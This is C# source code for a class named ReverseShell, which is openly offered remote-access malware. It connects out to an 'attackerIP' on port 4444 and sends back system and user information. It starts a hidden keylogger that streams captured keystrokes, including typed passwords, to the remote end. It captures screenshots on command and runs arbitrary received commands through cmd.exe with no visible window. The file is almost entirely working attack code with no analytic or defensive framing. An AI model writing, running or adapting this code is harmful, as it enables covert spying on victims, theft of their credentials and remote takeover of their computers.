using System;
using System.Diagnostics;
using System.Drawing; 
using System.Drawing.Imaging; 
using System.IO;
using System.Management;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms; 

class ReverseShell
{
    static string GetSystemInfo()
    {
        string info = "[SYSTEM INFO]\n";
        info += $"OS: {Environment.OSVersion}\n";
        info += $"Machine Name: {Environment.MachineName}\n";
        info += $"User Name: {Environment.UserName}\n";
        info += $"CPU: {GetHardwareInfo("Win32_Processor", "Name")}\n";
        info += $"RAM: {GetHardwareInfo("Win32_ComputerSystem", "TotalPhysicalMemory")} bytes\n";
        return info;
    }

    static void CaptureScreenshot(StreamWriter writer)
    {
        try
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Jpeg); 
                    string base64Image = Convert.ToBase64String(ms.ToArray());
                    writer.WriteLine($"[SCREENSHOT] {base64Image}");
                }
            }
        }
        catch (Exception ex)
        {
            writer.WriteLine($"[ERROR] Screenshot failed: {ex.Message}");
        }
    }

    static string ConvertKey(int keyCode)
    {
        if (keyCode == 160 || keyCode == 161 || keyCode == 162 || keyCode == 163 || keyCode == 164)
        {
            return string.Empty;
        }

        switch (keyCode)
        {
            case 8: return "[BACKSPACE]";
            case 9: return "[TAB]";
            case 13: return "[ENTER]";
            case 27: return "[ESC]";
            case 32: return " ";
            case 37: return "[LEFT]";
            case 38: return "[UP]";
            case 39: return "[RIGHT]";
            case 40: return "[DOWN]";
            default:
                if (keyCode >= 65 && keyCode <= 90)
                {
                    return ((char)keyCode).ToString().ToLower();
                }
                else if (keyCode >= 48 && keyCode <= 57)
                {
                    return ((char)keyCode).ToString();
                }
                else if (keyCode >= 96 && keyCode <= 105)
                {
                    return ((char)(keyCode - 48)).ToString();
                }
                else
                {
                    return string.Empty;
                }
        }
    }

    static string GetHardwareInfo(string hwclass, string syntax)
    {
        ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT {syntax} FROM {hwclass}");
        foreach (ManagementObject obj in searcher.Get())
        {
            return obj[syntax]?.ToString() ?? "Unknown";
        }
        return "Unknown";
    }

    static void Keylogger(StreamWriter writer)
    {
        StringBuilder logBuffer = new StringBuilder();
        object writerLock = new object();

        while (true)
        {
            Thread.Sleep(50);
            for (int i = 0; i < 255; i++)
            {
                if (GetAsyncKeyState(i) == -32767) 
                {
                    string key = ConvertKey(i);

                    if (!string.IsNullOrEmpty(key))
                    {
                        logBuffer.Append(key);
                        //Console.WriteLine($"Key pressed: {key}"); 

                        if (key == "[ENTER]")  
                        {
                            if (logBuffer.Length > 0)
                            {
                                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {logBuffer.ToString()}";
                                lock (writerLock) 
                                {
                                    writer.WriteLine("[KEYLOG] " + logEntry);
                                    writer.Flush();
                                }
                                logBuffer.Clear();
                            }
                        }
                    }
                }
            }
        }
    }

    [DllImport("user32.dll")]
    static extern short GetAsyncKeyState(int vKey);

    static void Main()
    {
        string attackerIP = "127.0.0.1";
        int attackerPort = 4444;

        try
        {
            //Console.WriteLine("[+] Attempting to connect to server..."); 
            using (TcpClient client = new TcpClient(attackerIP, attackerPort))
            using (NetworkStream stream = client.GetStream())
            using (StreamReader reader = new StreamReader(stream))
            using (StreamWriter writer = new StreamWriter(stream))
            {
                writer.AutoFlush = true;
                //Console.WriteLine("[+] Connected to server."); 

                string systemInfo = GetSystemInfo();
                writer.WriteLine(systemInfo);
                //Console.WriteLine("[+] System info sent to server."); 

                Thread keyloggerThread = new Thread(() => Keylogger(writer));
                keyloggerThread.Start();
                //Console.WriteLine("[+] Keylogger thread started.");

                while (true)
                {
                    string command = reader.ReadLine();
                    if (command == null)
                    {
                        Console.WriteLine("[-] Server disconnected."); 
                        break;
                    }

                    if (command.ToLower() == "exit") break;

                    if (command.ToLower() == "screenshot")
                    {
                        CaptureScreenshot(writer);
                    }
                    else
                    {
                        Process proc = new Process();
                        proc.StartInfo.FileName = "cmd.exe";
                        proc.StartInfo.Arguments = "/c " + command;
                        proc.StartInfo.RedirectStandardOutput = true;
                        proc.StartInfo.RedirectStandardError = true;
                        proc.StartInfo.UseShellExecute = false;
                        proc.StartInfo.CreateNoWindow = true;
                        proc.Start();

                        string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                        writer.WriteLine(output);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }
}
